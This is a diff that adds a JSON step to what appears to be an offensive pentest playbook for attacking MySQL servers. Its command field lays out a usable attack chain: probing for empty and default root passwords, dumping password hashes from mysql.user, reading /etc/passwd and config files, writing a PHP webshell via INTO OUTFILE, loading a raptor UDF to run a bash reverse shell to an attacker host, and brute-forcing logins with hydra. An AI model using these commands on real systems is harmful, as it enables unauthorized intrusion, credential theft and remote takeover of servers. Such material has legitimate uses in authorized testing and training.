@@ -1,0 +1,26 @@
+{
+  "id": "mysql",
+  "phase": "RECON",
+  "title": "MySQL (3306)",
+  "body": "MySQL with FILE privilege = read/write OS files. INTO OUTFILE drops a webshell. UDF gives full RCE. Root with no password is common on dev boxes.",
+  "cmd": "nmap -p 3306 -sV --script mysql-info,mysql-empty-password $ip\nmysql -u root -h $ip           # no password\nmysql -u root -h $ip -p        # try: root, password, mysql, toor\n\n# Default creds: root:(blank)  root:root  root:password\n\n# Enumerate once connected\nSHOW DATABASES; USE <db>; SHOW TABLES;\nSELECT user,host,authentication_string FROM mysql.user;\nSHOW VARIABLES LIKE 'secure_file_priv';  # empty = no restriction\nSHOW VARIABLES LIKE 'plugin_dir';\n\n# Read files (needs FILE priv)\nSELECT LOAD_FILE('/etc/passwd');\nSELECT LOAD_FILE('/var/www/html/config.php');\n\n# Write webshell (needs FILE priv + webroot write)\nSELECT '<?php system($_GET[\"cmd\"]); ?>'\n  INTO OUTFILE '/var/www/html/shell.php';\n\n# UDF RCE (MySQL running as root)\n# searchsploit mysql udf — compile raptor_udf2.c\nSELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';\nCREATE FUNCTION do_system RETURNS integer SONAME 'raptor_udf2.so';\nSELECT do_system('bash -i >& /dev/tcp/$lhost/$lport 0>&1');\n\n# Brute force\nhydra -l root -P rockyou.txt $ip mysql",
+  "warn": "secure_file_priv restricts INTO OUTFILE. If set to a specific path, you can only write there.",
+  "choices": [
+    {
+      "label": "INTO OUTFILE webshell — got RCE",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "UDF RCE worked — got shell",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Dumped creds from DB",
+      "next": "creds_found"
+    },
+    {
+      "label": "Read sensitive config file",
+      "next": "creds_found"
+    }
+  ]
+}
